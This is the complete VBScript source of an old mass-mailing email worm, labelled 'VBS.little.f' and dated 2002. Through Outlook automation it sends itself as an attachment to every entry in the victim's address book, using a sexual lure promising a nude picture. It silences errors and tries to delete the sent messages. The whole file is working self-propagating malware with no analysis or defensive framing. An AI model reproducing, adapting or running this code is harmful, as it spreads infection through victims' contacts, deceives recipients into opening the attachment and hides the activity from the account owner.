'VBS.little.f by Negral (c)2002
Dim x 
on error resume next 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Wanna see ..." 
Mail.Body="this little pic of me naked?" 
Mail.Attachments.Add WScript.ScriptFullName
Mail.Send
Mail.DeleteAfterSubmit = True
Next 
ol.Quit 
